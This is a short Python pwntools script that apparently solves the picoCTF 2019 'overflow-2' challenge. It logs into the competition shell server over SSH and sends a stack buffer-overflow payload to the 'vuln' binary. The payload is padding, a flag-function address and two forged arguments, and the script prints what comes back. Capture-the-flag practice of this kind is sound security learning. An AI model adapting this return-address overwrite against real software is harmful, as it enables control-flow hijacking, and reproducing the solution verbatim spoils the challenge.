from os import environ
from pwn import *

PATH='/problems/overflow-2_5_4db6d300831e973c59360066ec1cf0a4'
EXEC='vuln'

flag_call_adr = 0x080485e6
a1 = 0xDEADBEEF
a2 = 0xC0DED00D

send = (0xb8+4)*b'x' + p32(flag_call_adr) + b'x'*4 + p32(a1) + p32(a2)

s = ssh(host='2019shell1.picoctf.com',
        user=environ["PICOUSER"],
        password=environ["PICOPSWD"])

sh = s.process(EXEC, cwd=PATH)

sh.sendlineafter('Please enter your string: ', send)

x = sh.recvrepeat()

print(x.decode(errors='ignore'))

s.close()